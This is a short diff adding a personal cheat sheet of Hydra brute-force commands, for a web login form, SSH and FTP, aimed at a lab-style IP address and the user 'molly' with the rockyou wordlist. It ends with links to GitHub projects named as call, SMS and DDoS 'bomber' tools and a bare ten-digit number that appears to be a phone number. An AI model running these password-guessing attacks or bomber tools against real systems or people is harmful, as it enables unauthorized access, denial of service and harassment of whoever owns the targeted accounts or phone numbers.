@@ -1,0 +1,36 @@
+
+## ------ HYDRA -------###
+
+
+ Web Login form: -----
+
+  hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+
+  hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+  
+  
+  
+  BRute force SSH:=----
+  
+  
+  hydra -l root -P passwords.txt 10.10.192.1 -t 4 ssh
+    
+     OR
+   
+  hydra -l user -P passlist.txt ftp://10.10.192.1
+   
+   
+   
+  hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.192.1
+
+
+https://github.com/U7P4L-IN/CALL-BOMBER
+
+https://github.com/Priyans0830m/DDOS-BOMBER
+
+https://github.com/Th3-C0der/Th3-Bomber
+
+
+
+      9310848312
